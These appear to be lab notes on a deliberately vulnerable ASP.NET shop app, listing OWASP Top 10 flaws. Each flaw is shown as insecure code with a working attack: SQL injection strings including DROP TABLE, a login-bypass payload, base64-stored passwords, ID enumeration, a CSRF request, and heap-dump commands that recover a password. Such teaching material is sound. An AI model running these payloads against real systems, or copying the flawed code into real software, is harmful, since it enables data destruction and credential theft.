1. SQL injection
    var products = _context.Products
                    .FromSqlRaw($"SELECT * FROM Products WHERE Name LIKE '%{query}%'")
                    .ToList();
        %' OR '1'='1'; -- 
        %'; DROP TABLE Products; --
        %'; DROP TABLE Products; --

2. Identification and Authentication Failures
    SELECT * FROM Users WHERE Username = '{1}' AND Password = '{2}'
        bypass:
        data = {
            "Username": "admin",
            "Password": "' OR '1'='1"
        }

3. Cryptographic Failures
    user.Password = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(user.Password));
        while database being leaked out:
        for enc in user.Password:
            print(base64.b64decode(enc))

4. Insecure direct object references
    var product = _context.Products.Find(id);
        for i in range(100):
            req = request.get(url + "/Home/ProductDetails/" + str(i))
            print(req.text)

5. Insecure Design
    [HttpPost]
    public IActionResult AddToCart(int id)
    {
        return RedirectToAction("Index");
    }
        Can be easily to CSRF:
            fetch("http://localhost:5057/Home/AddToCart", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({ id: "1" })
            });

6. Security Misconfiguration
    Print all error message to frontend:
        MySqlException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1
        MySqlConnector.Core.ResultSet.ReadResultSetHeaderAsync(IOBehavior ioBehavior) in ResultSet.cs
        MySqlConnector.MySqlDataReader.ActivateResultSet(CancellationToken cancellationToken) in MySqlDataReader.cs
        MySqlConnector.MySqlDataReader.NextResultAsync(IOBehavior ioBehavior, CancellationToken cancellationToken) in MySqlDataReader.cs
        MySqlConnector.MySqlDataReader.DisposeAsync(IOBehavior ioBehavior, CancellationToken cancellationToken) in MySqlDataReader.cs
        MySqlConnector.MySqlDataReader.Close() in MySqlDataReader.cs
        Microsoft.EntityFrameworkCore.Storage.RelationalDataReader.Dispose()
        Microsoft.EntityFrameworkCore.Query.Internal.FromSqlQueryingEnumerable<T>+Enumerator.Dispose()
        System.Collections.Generic.List<T>..ctor(IEnumerable<T> collection)
        System.Linq.Enumerable.ToList<TSource>(IEnumerable<TSource> source)
        Owasp2021Top10.Controllers.HomeController.Search(string query) in HomeController.cs
        +
                    var products = _context.Products
        lambda_method109(Closure , object , object[] )
        Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor+SyncActionResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, object controller, object[] arguments)
        Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeActionMethodAsync()
        Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(ref State next, ref Scope scope, ref object state, ref bool isCompleted)
        Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeNextActionFilterAsync()
        Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
        Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(ref State next, ref Scope scope, ref object state, ref bool isCompleted)
        Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
        Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeNextResourceFilter>g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, object state, bool isCompleted)
        Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.Rethrow(ResourceExecutedContextSealed context)
        Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.Next(ref State next, ref Scope scope, ref object state, ref bool isCompleted)
        Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.InvokeFilterPipelineAsync()
        Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
        Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
        Microsoft.AspNetCore.Routing.EndpointMiddleware.<Invoke>g__AwaitRequestTask|6_0(Endpoint endpoint, Task requestTask, ILogger logger)
        Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
        Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware.Invoke(HttpContext context)

7. Insecure Binder Configuration:
    Add bill to post registry data

8. Heap Inspection:
    dotnet-dump collect -p <app-pid>
    open it with windbg:
        1. .load C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll
        2. !dumpheap -type System.String
        3. .logopen /t c:\path\to\your\file.txt
        4. .foreach (obj {!dumpheap -mt <MT of System.String>}) { .printf "\n\nObject: ${obj}\n"; !do ${obj} }
        5. .logclose
    open file.txt and finded the password

        Object: 01a2de580e80
        Name:        System.String
        MethodTable: 00007ffec25ad708
        EEClass:     00007ffec2589e38
        Tracked Type: false
        Size:        36(0x24) bytes
        File:        C:\Program Files\dotnet\shared\Microsoft.NETCore.App\6.0.32\System.Private.CoreLib.dll
        String:      pass123
        Fields:
                    MT    Field   Offset                 Type VT     Attr            Value Name
        00007ffec25994b0  40002f2        8         System.Int32  1 instance                7 _stringLength
        00007ffec24fea28  40002f3        c          System.Char  1 instance               70 _firstChar
        00007ffec25ad708  40002f1       e8        System.String  0   static 000001a05e4313a0 Empty

